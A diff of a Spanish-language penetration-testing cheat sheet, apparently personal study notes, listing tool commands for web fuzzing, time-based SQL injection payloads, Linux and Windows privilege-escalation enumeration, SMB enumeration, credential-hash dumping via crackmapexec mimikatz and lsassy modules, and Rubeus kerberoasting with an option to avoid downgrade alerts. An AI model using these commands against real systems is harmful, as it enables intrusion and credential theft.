@@ -1,10 +1,10 @@
 
 Herramientas generales:
-    -Burpsuite:
-        -Proxy: Herramienta necesaria para interceptar peticiones HTTP/HTTPS.
-        -Repeater: Herramienta utilizada para modificar y manipular una petición.
+	-Burpsuite:
+		-Proxy: Herramienta necesaria para interceptar peticiones HTTP/HTTPS.
+		-Repeater: Herramienta utilizada para modificar y manipular una petición.
         -Intruder: Herramienta utilizada para realizar ataques de fuerza bruta/reemplazo de valores.
-        -Chisel: Herramienta que permite realizar reenvio de puertos entre sistemas.
+        -Chisel/Socat: Herramienta que permite realizar reenvio de puertos entre sistemas.
     -Netcat:
         -Herrmienta liviana para establecer conexiones via TCP/UDP.
             -Establecer una conexión hacia un puerto remoto: nc 1.1.1.1 443 -vvv
@@ -22,7 +22,7 @@ Herramientas generales:
      -Rubeus: Herramienta que permite realizar ataques de Kerberoast.
             Ejemplo #01 identificar y validar usuarios: Rubeus.exe kerberoast /stats
             Ejemplo #02 generar ataque contra la cuenta "accountservice": Rubeus.exe kerberoast /user:accountservice                    /simple /outfile: Path/to/hashoutput
-            Ejemplo #03 generar ataque evitando alertas de downgrade de protocolos: Rubeus.exe kerberoast                               /user:accountservice /rc4opsec /outfile: Path/to/hashoutput
+			Ejemplo #03 generar ataque evitando alertas de downgrade de protocolos: Rubeus.exe kerberoast                               /user:accountservice /rc4opsec /outfile: Path/to/hashoutput
 
 Utiles:
     Busqueda por cadenas de texto en CMD: type ARCHIVO.txt | findstr "Password"
@@ -34,6 +34,8 @@ Pentest de aplicaciones WEB.
             Fuzzing de directorios: wfuzz -c -L --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://1.1.1.1/FUZZ
             Fuzzing de subdominios: wfuzz -c -L --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H 'Host: FUZZ.dominio.com' http://dominio.com
             Fuzzing de ficheros(Añadir extensión al final): wfuzz -c -L --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://1.1.1.1/FUZZ.txt
+        -Gobuster:
+            Fuzzing de directorios: gobuster dir -U 192.168.10.10 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
     -SQLi
         -Error based SQLi: Inyección basada en romper la estructura de la query para visualizar el error, entender la consulta y alterar la misma.
         Posibles payloads a probar: ' ) - ( , . ; : { } 
@@ -50,7 +52,6 @@ Pentest de aplicaciones WEB.
             -Enumeración de base de datos utilizando "like" y "sleep()"(script): union select 1,sleep(1) and database() like 'd%';--
             -Enumeración de tablas utilizando "like" letra a letra (script): union select 1,sleep(1) from information_schema.tables where table_schema = 'DB' and table_name like 'a%';--
             -Enumeración de columnas utilizando "like" letra a letra (scriptt): union select 1,sleep(1) from information_schema.columns where table_schema = 'DB' and table_name = 'tabla01' and column_name like '%a';--
-          
     -XSS
     -XXE
     -SSRF
@@ -63,12 +64,16 @@ Pentest sobre linux.
     -Herramientas
         -linPEAS: Es una herramienta de enumeración e identificación con fines de encontrar posibles vias para escalar privilegios.
     -Descubrimiento de puertos
-    -Información de versiones
     -Enumeración
         -Sistema operativo: uname -a
         -Interfaces de red: ip a / ifconfig 
+		-Rutas a nivel de red: ip r
         -Puertos abiertos de forma local: netstat -anp / ss -lntu / cat /proc/net/tcp | awk '{print $2}' / cat /proc/net/udp | awk '{print $2}'
         -Endpoints asociados: cat /etc/hosts
+		-Procesos ejecutandose: ps aux
+		-Grupos asociados a un usuario: id / id user
+		-Privilegios de sudo de un usuario: sudo -l
+		-Binarios con privilegios SUID: find / -perm -4000 2>/dev/null
         
     -Identificación de exploits
     -Troubleshooting
@@ -83,7 +88,6 @@ Pentest sobre windows.
         -winPEAS: Es una herramienta de enumeración e identificación con fines de econtrar posibles vias para escalar privilegios.
         -impacket-psexec: Herramienta que permite realizar una conexión directa utilizando el protocolo SMB (445).
     -Descubrimiento de puertos
-    -Información de versiones
     -Enumeración
         -Enumerar usuarios:
             net user
@@ -101,6 +105,16 @@ Pentest sobre windows.
             -Enumerar todos los datos del usuario actual: whoami /all
             -Enumerar todos los grupos del usuaro actual: whoami /group
             -Enumerar privilegios heredados del usuario actual: whoami /priv
+            -Enumerar detalles del sistema: systeminfo
+        -Enumeracion de recursos compartidos utilizando null sessión.
+            -smbclient -L 192.168.10.10 -U ''
+            -smbmap 192.168.10.10 -N
+		-Enumeración de recursos compartidos utilizando un usuario válido.
+			-crackmapexec smb 192.168.10.10 -u user -p password --shares
+		-Enumeración de usuarios utilizando un usuario válido:
+			-GetADUsers.py -all -dc-ip 192.168.10.20 domain.local/user
+		-Enumeración de servicios vulnerables:
+			-powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws.output.txt
     -Identificación de exploits
     -Troubleshooting
     -Escalación de privilegios
@@ -146,11 +160,19 @@ Pentest sobre Active Directory.
             Ejemplo #2 enumerar Grupos a los que pertenece un grupo: Get-ADPrincipalGroupMembership -Identity GRUPO
     -Descubrimiento de puertos
     -Información de versiones
-    -Enumeración:
+    -Enumeración remota:
+        -Crackmapexec: Herramienta utilizada para enumerar de diversas formas.
+            Ejemplo #1 enumeración básica: crackmapexec smb 192.168.10.200
+            Ejemplo #2 enumeración credenciales: crackmapexec smb 192.168.10.200 administrator:password$.1
+            Ejemplo #3 enumeración de usuarios con privilegios WINRM: crackmapexec winrm 192.168.10.200 administrator:password$.1     
+			Ejemplo #4 enumeración de grupos: crackmapexec smb 192.168.10.200 user:password$1 --groups
+			Ejemplo #5 enumeración de hashes utilizando el módulo mimikatz: crackmapexec smb -M mimikatz 192.168.10.200 administrator:password$.1
+			Ejemplo #6 enumeración de hashes LSAS utilizando el modulo lsassy: crackmapexec smb -M lsassy 192.168.10.200 administrator:password$.1
+		-GetUserSPNs.py
+			Ejemplo #1 identificar usuarios con el atributo 'ServicePrincipalName': GetUserSPNs.py -dc-ip 192.168.10.200 domain.local/user
     -Ataques a Active Directory
-        -Kerberoast: Es un ataque orientado a la obtención de un TGS (Ticket Granting Service) de una cuenta, dicho ticket              es un hash que contempla la contraseña de la cuenta, la obtención de ticket es silenciosa y dicho ticket puede 
-             puede ser crackeado con herramientas como John o Hashcat.
-    
+        -Kerberoast: Es un ataque orientado a la obtención de un TGS (Ticket Granting Service) de una cuenta, dicho ticket              es un hash que contempla la contraseña de la cuenta, la obtención de ticket es silenciosa y dicho ticket puede puede ser crackeado con herramientas como John o Hashcat.
+		-AS-Rep Roast: 
 Ataque a contraseñas.
     -Crackeado con Jhon
     -Crackeado con Hashcat
